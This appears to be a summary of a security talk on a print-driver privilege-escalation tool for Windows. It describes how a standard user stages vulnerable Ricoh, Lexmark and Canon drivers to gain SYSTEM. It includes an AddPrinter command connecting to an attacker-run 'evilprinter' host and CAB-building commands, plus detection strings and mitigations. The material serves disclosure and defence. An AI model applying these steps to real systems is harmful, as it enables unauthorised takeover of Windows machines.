# Staging a Print Driver: Windows Vulnerability Analysis

## Is This a Windows Vulnerability?

### Yes
- **Security Boundary Crossed**: We have crossed a security boundary.
- **User Privilege Escalation**: A standard user can write a driver of their choosing into the Driver Store.
- **System Privilege Escalation**: The chosen driver allows escalation to SYSTEM.

### No
- **Designed Functionality**: This is working as designed.
- **Features vs. Vulnerabilities**: Features are not vulnerabilities.

## Is This Useful?
- **Exploiting Old Drivers**: There is nothing stopping us from installing old print drivers with known vulnerabilities.
- **Patching Challenges**: There is no obvious way to patch this issue.

## Bring Your Own Print Driver Vulnerability

### Tool Introduction: Concealed Position
- **GitHub Repository**: [Concealed Position](https://github.com/jacob-baines/concealed_position/)
- **Development Details**:
  - **Language**: C++
  - **Components**:
    - **Server**: Configures the evil printer.
    - **Client**: Automates driver staging and privilege escalation.
    - **DLL**: The code to execute as SYSTEM.
- **Implemented Exploits**:
  - **CVE-2020-1300 (SlashingDamage)**: Windows
  - **CVE-2019-19363 (PoisonDamage)**: Ricoh
  - **CVE-2021-35449 (AcidDamage)**: Lexmark
  - **CVE-2021-??? (RadiantDamage)**: Canon
  - **Local-Only Exploitation**: The last three exploits support local-only exploitation if the affected driver is in the driver store.

### Concealed Position Client
- **API Calls**:
  - **Remote Printer Calls**:
    - `OpenPrinter`
    - `GetPrinterDriver`
    - `ClosePrinter`
  - **Local Calls**:
    - `InstallPrinterDriverFromPackage`
    - `AddPrinter`
    - `DeletePrinter`
    - `ClosePrinter`
- **Characteristics**:
  - Silent operation
  - No UI
  - No Windows Update

### Why Not PowerShell?
- **Driver Store Introduction**:
  - `AddPrinter -ConnectionName \\10.0.0.6\evilprinter`
  - **Issues**: Invokes and gets stuck in Windows Update.
- **Preference for C++**: The author prefers C++ for this implementation.

## New Driver Vulnerabilities

### CVE-2021-35449: AcidDamage
- **Affected Driver**: Lexmark Universal Printer Driver 2.15.1.0 and below.
- **Attack Vector**: Reads an attacker-controlled configuration file from ProgramData to locate a .dll, allowing the insertion of a malicious dll to escalate to SYSTEM.
- **Implementation**:
  - **GitHub Link**: [AcidDamage Implementation](https://github.com/jacob-baines/concealed_position/blob/main/src/cp_client/aciddamage.cpp)
  - **Metasploit Pull Request**: Expected to be available at the time of presentation.
- **CAB File Creation**:
  - Download version 2.10.0.5 from the Update Catalog.
  - Create a CAB file using the following commands:
    ```sh
    dir /s /b /a-d > ../files.txt
    -- modify files.txt to include DestinationDir --
    makecab /D MaxDiskSize=268435456 /d “CabinetName1=LMUD1o40.cab” /f ../files.txt
    ```

### CVE-2021-??? RadiantDamage
- **Affected Driver**: Canon TR150 Driver 3.71.2.10 and below.
- **Attack Vector**: Race condition to overwrite a dll in `C:\ProgramData\CanonBJ\IJPrinter\CNMWINDOWS\Canon TR150 Series\LanguageModules\`.
- **Difficulty**: Harder to time than the Ricoh vulnerability.
- **Implementation**:
  - **GitHub Link**: [RadiantDamage Implementation](https://github.com/jacob-baines/concealed_position/blob/main/src/cp_client/radiantdamage.cpp)
  - **Metasploit Pull Request**: Expected to be available at the time of presentation.
- **CAB File Creation**:
  ```sh
  dir /s /b /a-d > ../files.txt
  makecab /D MaxDiskSize=268435456 /d “CabinetName1=TR1506.cab” /f ../files.txt
  ```

## Detection and Mitigation

### Detection
- **Event ID 600**
- **Event ID 215**
- **SetupAPI.Dev**
- **On the Wire**: [Detection GitHub Repository](https://github.com/jacob-baines/concealed_position/tree/main/detection)
- **Unique String**:
  - **cp_client.exe**: Contains a 64-byte unique string for detection: `WVqtcQKfeIUxunX1jAadGwMiir5LacjHwN8tVl1Pr7AiwJnZCsik2TxHLZgGhErb`
  - **YARA Rule**: Available in the detections subdirectory.

### Mitigations
- **Patching**: May never be an option.
- **Driver Removal**: Search user driver stores for affected drivers and remove them using `pnputil.exe /enum-drivers`.
- **Group Policy Object (GPO)**: Enable "Package Point and Print - Approved Servers".
